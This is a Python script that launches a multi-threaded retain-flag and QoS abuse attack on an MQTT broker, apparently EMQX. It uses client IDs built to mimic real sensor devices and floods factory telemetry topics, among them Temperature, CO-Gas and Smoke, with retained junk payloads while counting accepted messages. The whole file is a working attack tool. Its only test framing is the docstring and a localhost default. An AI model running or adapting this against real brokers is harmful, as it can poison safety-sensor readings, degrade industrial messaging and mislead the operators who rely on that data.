#!/usr/bin/env python3
"""
MQTT Retain/QoS Abuse Attack Script (Windows Compatible)
=======================================================
Simulates retain flag and QoS abuse to test EMQX message handling and storage.

Client IDs are generated in the form:
    energy-<device_base><index>-replayer
e.g. energy-sensor_cooler13-replayer
"""

import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import sys
import os
from datetime import datetime, timezone


def make_client_id(device_base: str, index: int,
                   prefix: str = "energy-", suffix: str = "replayer",
                   sep: str = "-") -> str:
    """
    Build client-id like: energy-sensor_cooler13-replayer

    - device_base: e.g. 'sensor_cooler', 'sensor_fanspeed', 'sensor_motion'
    - index: integer appended to device_base (13, 2, 18, ...)
    - prefix: 'energy-' by default
    - suffix: 'replayer' by default
    - sep: separator before the suffix ( '-' by default )
    """
    device = str(device_base).strip().replace(" ", "_")
    idx = int(index)
    return f"{prefix}{device}{idx}{sep}{suffix}"


class RetainQoSAbuseAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "retain_messages_sent": 0,
            "qos_messages_sent": 0,
            "messages_accepted": 0,
            "messages_rejected": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }

    def create_client(self, client_id):
        """Create MQTT client (no auth/TLS for port 1883)"""
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def _derive_device_base_from_topic(self, topic: str) -> str:
        """
        Extract a readable device base from a topic.
        Example: 'factory/office/Device013/telemetry' -> 'sensor_device013'
        Adjust this function if your topic format differs.
        """
        try:
            if not topic:
                return "sensor_unknown"
            piece = topic.split('/')[-2] if '/' in topic else topic
            # normalize Device000 -> sensor_device000
            piece = piece.replace("-", "_")
            piece = piece.lower()
            # convert 'device013' -> 'sensor_device013' (tunable)
            if piece.startswith("device"):
                piece = "sensor_" + piece
            return piece
        except Exception:
            return "sensor_unknown"

    def _get_client_id_for_worker(self, worker_id: int, topics: list, fallback_types=None):
        """
        Build client id using topic-derived device_base if topics provided,
        otherwise use a rotating fallback list.
        """
        if fallback_types is None:
            fallback_types = ["sensor_cooler", "sensor_fanspeed", "sensor_motion"]

        if topics and len(topics) > 0:
            sample_topic = topics[worker_id % len(topics)]
            device_base = self._derive_device_base_from_topic(sample_topic)
            # try to extract numeric suffix from topic piece if present
            # example: sensor_device013 -> device013 -> index = 13
            idx = (worker_id + 1)
            # attempt to parse trailing digits from piece
            digits = ''.join(ch for ch in device_base if ch.isdigit())
            if digits:
                try:
                    idx = int(digits)
                except Exception:
                    idx = worker_id + 1
            return make_client_id(device_base, idx)
        else:
            device_base = fallback_types[worker_id % len(fallback_types)]
            return make_client_id(device_base, worker_id + 1)

    def retain_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for retain flag abuse"""
        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected, starting retain abuse...")

            # Send retain messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/retain/{worker_id}"
                    # Generate payload
                    payload = {
                        "attack_type": "retain_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "retain_data": "R" * random.randint(100, 1000)
                    }

                    # Publish with retain flag
                    result = client.publish(topic, json.dumps(payload), qos=0, retain=True)

                    self.attack_stats["retain_messages_sent"] += 1

                    # result is MQTTMessageInfo; info.rc == 0 indicates accepted by client lib
                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id} ({client_id}): Retain message {i} accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): Retain message {i} rejected")

                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id} ({client_id}): Error sending retain message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed retain abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def qos_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for QoS abuse"""
        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected, starting QoS abuse...")

            # Send QoS messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/qos/{worker_id}"

                    # Random QoS level
                    qos_level = random.choice([0, 1, 2])

                    # Generate payload
                    payload = {
                        "attack_type": "qos_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "qos_level": qos_level,
                        "qos_data": "Q" * random.randint(100, 1000)
                    }

                    # Publish with QoS
                    result = client.publish(topic, json.dumps(payload), qos=qos_level)

                    self.attack_stats["qos_messages_sent"] += 1

                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id} ({client_id}): QoS {qos_level} message {i} accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): QoS {qos_level} message {i} rejected")

                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id} ({client_id}): Error sending QoS message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed QoS abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def mixed_abuse_worker(self, worker_id, topics, num_messages=100, delay_ms=100):
        """Worker thread for mixed retain/QoS abuse"""
        client_id = self._get_client_id_for_worker(worker_id, topics)
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        try:
            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            print(f" Worker {worker_id} ({client_id}): Connected, starting mixed abuse...")

            # Send mixed messages
            for i in range(num_messages):
                try:
                    topic = random.choice(topics) if topics else f"test/mixed/{worker_id}"

                    # Random QoS and retain combination
                    qos_level = random.choice([0, 1, 2])
                    retain_flag = random.choice([True, False])

                    # Generate payload
                    payload = {
                        "attack_type": "mixed_abuse",
                        "worker_id": worker_id,
                        "message_id": i,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "mixed_data": "M" * random.randint(100, 1000)
                    }

                    # Publish with mixed settings
                    result = client.publish(topic, json.dumps(payload), qos=qos_level, retain=retain_flag)

                    if retain_flag:
                        self.attack_stats["retain_messages_sent"] += 1
                    else:
                        self.attack_stats["qos_messages_sent"] += 1

                    if getattr(result, "rc", 1) == 0:
                        self.attack_stats["messages_accepted"] += 1
                        if i % 20 == 0:  # Don't spam
                            print(f" Worker {worker_id} ({client_id}): Mixed message {i} (QoS:{qos_level}, Retain:{retain_flag}) accepted")
                    else:
                        self.attack_stats["messages_rejected"] += 1
                        print(f" Worker {worker_id} ({client_id}): Mixed message {i} rejected")

                    # Delay between messages
                    if delay_ms > 0:
                        time.sleep(delay_ms / 1000.0)

                except Exception as e:
                    self.attack_stats["messages_rejected"] += 1
                    if i % 20 == 0:  # Don't spam errors
                        print(f" Worker {worker_id} ({client_id}): Error sending mixed message {i}: {e}")

            print(f" Worker {worker_id} ({client_id}): Completed mixed abuse attack")

        except Exception as e:
            print(f" Worker {worker_id} ({client_id}): Connection failed: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def launch_attack(self, attack_type="mixed", num_workers=2, messages_per_worker=100,
                     delay_ms=100, topics=None):
        """Launch retain/QoS abuse attack"""
        if topics is None or len(topics) == 0:
            topics = [
                "factory/tenantA/Temperature/telemetry",
                "factory/tenantA/Humidity/telemetry",
                "factory/tenantA/Motion/telemetry",
                "factory/tenantA/CO-Gas/telemetry",
                "factory/tenantA/Smoke/telemetry",
                "system/test/retain",
                "security/test/qos"
            ]

        print(f" Starting Retain/QoS Abuse Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Messages per worker: {messages_per_worker}")
        print(f"   Delay: {delay_ms}ms")
        print(f"   Topics: {len(topics)}")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        # Create worker threads based on attack type
        threads = []

        if attack_type == "retain":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.retain_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)
        elif attack_type == "qos":
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.qos_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)
        else:  # mixed
            for i in range(num_workers):
                thread = threading.Thread(
                    target=self.mixed_abuse_worker,
                    args=(i, topics, messages_per_worker, delay_ms)
                )
                threads.append(thread)

        # Start all workers
        for thread in threads:
            thread.start()

        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        """Print attack statistics"""
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        total_messages = self.attack_stats["retain_messages_sent"] + self.attack_stats["qos_messages_sent"]

        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Retain messages sent: {self.attack_stats['retain_messages_sent']}")
        print(f"QoS messages sent: {self.attack_stats['qos_messages_sent']}")
        print(f"Total messages: {total_messages}")
        print(f"Messages accepted: {self.attack_stats['messages_accepted']}")
        print(f"Messages rejected: {self.attack_stats['messages_rejected']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")

        if total_messages > 0:
            success_rate = (self.attack_stats['messages_accepted'] / total_messages * 100)
            print(f"Success rate: {success_rate:.1f}%")

        if duration > 0:
            print(f"Messages per second: {total_messages/duration:.1f}")


def main():
    parser = argparse.ArgumentParser(description="MQTT Retain/QoS Abuse Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--type", choices=["retain", "qos", "mixed"], default="mixed",
                        help="Attack type: retain, qos, or mixed")
    parser.add_argument("--workers", type=int, default=2, help="Number of worker threads")
    parser.add_argument("--messages", type=int, default=100, help="Messages per worker")
    parser.add_argument("--delay", type=int, default=100, help="Delay between messages (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom target topics")

    args = parser.parse_args()

    # Create attack instance (no auth/TLS)
    attack = RetainQoSAbuseAttack(
        broker_host=args.broker,
        broker_port=args.port
    )

    # Launch attack
    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        messages_per_worker=args.messages,
        delay_ms=args.delay,
        topics=args.topics
    )


if __name__ == "__main__":
    main()
